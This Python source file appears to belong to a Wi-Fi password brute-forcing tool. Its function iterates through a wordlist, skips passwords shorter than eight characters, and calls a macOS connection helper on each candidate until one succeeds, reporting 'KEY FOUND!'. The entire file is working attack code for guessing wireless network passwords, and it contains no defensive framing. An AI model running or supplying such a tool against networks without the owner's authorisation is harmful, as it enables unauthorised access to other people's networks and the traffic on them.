from src.connect import connect_to_wifi_macos
from src.util import Color
import time

def brute_force(selected_network, passwords, args):
    print("\nWifi-bf is running")

    for password in passwords:
        password = password.strip()

        if isinstance(password, str):
            decoded_line = password
        else:
            decoded_line = password.decode("utf-8")

        if args.verbose:
            print(f"{Color.HEADER}** TESTING **: with password '{decoded_line}'{Color.END}")

        if len(decoded_line) >= 8:
            success, message = connect_to_wifi_macos(selected_network, decoded_line)

            if success:
                print(f"{Color.GREEN}** KEY FOUND! **: password '{decoded_line}' succeeded.{Color.END}")
                return True
            else:
                if args.verbose:
                    print(f"{Color.FAIL}** TESTING **: password '{decoded_line}' failed.{Color.END}")
                    print(f"{Color.GRAY}{message}{Color.END}")

                time.sleep(1)
        else:
            if args.verbose:
                print(f"{Color.CYAN}** TESTING **: password '{decoded_line}' too short, passing.{Color.END}")

    print(f"{Color.FAIL}** RESULTS **: All passwords failed :({Color.END}")
    return False